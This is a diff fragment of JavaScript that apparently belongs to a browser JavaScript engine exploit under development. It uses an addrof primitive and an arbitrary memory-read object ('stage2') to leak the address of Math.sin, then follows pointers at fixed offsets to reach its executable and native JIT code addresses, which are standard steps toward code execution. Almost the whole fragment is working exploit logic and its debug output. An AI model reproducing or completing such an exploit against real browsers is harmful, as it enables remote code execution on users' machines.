@@ -637,13 +637,13 @@ for (var i = 0; i < 1000; ++i) {
    	memory = stage2;
 	var sinFuncAddr = addrof(Math.sin);
         print("Math.sin() @ " + sinFuncAddr);
-        var executableAddr = memory.readInt64(sinFuncAddr);
-	print("executableaddr @ " + executableAddr);
-        /*print("Math.sin() ExecutableAddr @ " + executableAddr); 
-        var jitCodeAddr = memory.read64(executableAddr , 3);
+        var executableAddr = memory.readInt64(Add(sinFuncAddr,24));
+	//print("executableaddr @ " + executableAddr);
+        print("Math.sin() ExecutableAddr @ " + executableAddr); 
+        var jitCodeAddr = memory.read64(Add(executableAddr , 24));
 	print("Math.sin() NativeJITCodeAddr @ " + jitCodeAddr);
         
-        var vtab = memory.read64(jitCodeAddr , 0);
+        /*var vtab = memory.read64(jitCodeAddr , 0);
         print("Math.sin() vtable @ " + vtab)*/
         /*var anchor1 = memory.readInt64(vtab)
         print("anchor1" + anchor1);
